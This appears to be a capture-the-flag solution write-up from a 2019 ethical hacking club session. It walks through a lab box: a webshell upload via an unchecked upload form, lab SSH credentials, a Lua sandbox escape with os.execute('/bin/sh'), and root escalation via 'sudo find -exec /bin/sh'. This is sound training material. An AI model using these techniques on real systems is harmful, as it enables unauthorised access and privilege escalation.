# CLUSIR Rhône-Alpes

## Ethical Hacking Club - 2019 . 04 . 11

### Correction

#### Step 1

Connect to http://172.31.254.100

All images are retrieved through an api.

First flag : **${CEH_ApiApiApiApiApi}**

#### Step 2

The upload form is vulnerable to Upload Injection:

When upload a different filetype than image a Flag is added to the response.

2nd flag : **${CEH_ThisIsNotAnImage}**

#### Step 3

Once a webshell has been uploaded,

you can find a `/flag` file

```
> cat /flag
${CEH_LeShellAuxSeychelles}
```

3rd flag: **${CEH_LeShellAuxSeychelles}**

Also, you'll find a `/connection.sh`

containing credentials to an ssh server:

```
> cat /connection.sh
ssh igor@172.31.254.200 -p 22 | echo "Zh1v0yPut1n"
```

#### Step 4

When connecting to the ssh server

a Lua env is popping up.

You've to escape the lua env: 

```lua
os.execute('/bin/sh')
```

There is a flag when escape the python env:

4th flag: **${CEH_LuaCarteSortieDePrison}**

And indicated a second flag at /root/flag

#### Step 5

Use escalation privilege to display 

```bash
$ sudo -l
User igor may run the following commands on af61e9ee9525:
    (root) NOPASSWD: /usr/bin/free
    (root) NOPASSWD: /usr/bin/clear
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /bin/ls
    (root) NOPASSWD: /usr/bin/users
    (root) NOPASSWD: /usr/bin/locale
    (root) NOPASSWD: /bin/mkdir
    (root) NOPASSWD: /usr/bin/who
    (root) NOPASSWD: /usr/bin/w
    (root) NOPASSWD: /usr/bin/arch
$ sudo find -exec /bin/sh \;
# whoami
root
# cat /root/flag
${CEH_LePythonDeLaFournaise}
```

5th flag: **${CEH_LePythonDeLaFournaise}**

---

THE END
